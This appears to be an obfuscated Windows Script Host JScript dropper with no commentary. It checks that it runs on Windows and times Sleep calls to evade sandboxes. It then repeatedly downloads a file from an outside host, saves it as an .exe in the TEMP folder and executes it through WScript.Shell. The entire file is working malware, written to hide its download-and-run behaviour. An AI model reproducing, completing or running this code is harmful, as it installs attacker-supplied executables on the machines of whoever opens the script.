var K0 = false;
var k0 = "CreateObject";
var f0 = function k() {return WScript[k0]("WScript.Shell");}(), Pr = 11;
var v = "MSXML2.XMLHTTP";
var C = 2123213;
var j = 0;
function eD(K){f0["Run"](K, j, j);};
function vG(){return "" + v;};
function bQ(C0, N){j = j * 1; return C0 - N;};
function f(){return k0;};
/*@cc_on
  @if (@_win32 || @_win64)
    K0 = true;
  @end
@*/
if (K0)
{
var ga = "";
function HC(){return 22;};
var T = 0; var Hm = 0;
function Y()
{
var zw = new this["Date"]();
var wB = zw["getUTCMilliseconds"]();
WScript["Sleep"](HC());
var zw = new this["Date"]();
var M = zw["getUTCMilliseconds"]();
WScript["Sleep"](HC());
var zw = new this["Date"]();
var Pb = zw["getUTCMilliseconds"]();
var T = "q";
T = bQ(M, wB);
var Hm = "g";
Hm = bQ(Pb, M);
ga = "open";
return bQ(T, Hm);
}
var I = false;
var Vl = false;
for (var E = j; E < HC() * 1; E++){if (Y() != j){
I = true; 
Hm = "31" + 11 * T + Hm; 
Vl = true; 
break;
}}
function Br() {return ((I == true) && (I == Vl)) ? 1 : j;};
if (I && Br() && Vl){
function b() {return f0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "H5MBO4Zxk7n.exe";};
 H = vG();
 MY = WScript[k0](H);
 var D = 1;
 while (D){
try {
MY[ga]("GET", "http://xn--kandypriv-j4a.com/lo4sad", false);
MY["send"]();
uZ = "Sleep";
for (;;){WScript[uZ](HC() * 11); if (MY["readystate"] >= 2 * 2) break;};
D = j;
} catch(nx){};
}
function tJ(gs) {var hO = (1, 2, 3, 4, 5, gs); return hO;};
kH = WScript[f()]("ADODB.Stream");
H = kH;
H[ga]();
H["type"] = tJ(1);
H["write"](MY["ResponseBody"]);
kH["position"] = tJ(j);
H["Save" + "ToFile"](b(), 2);
kH["c"+"lose"]();
ZK = b();
eD(ZK);
}
}

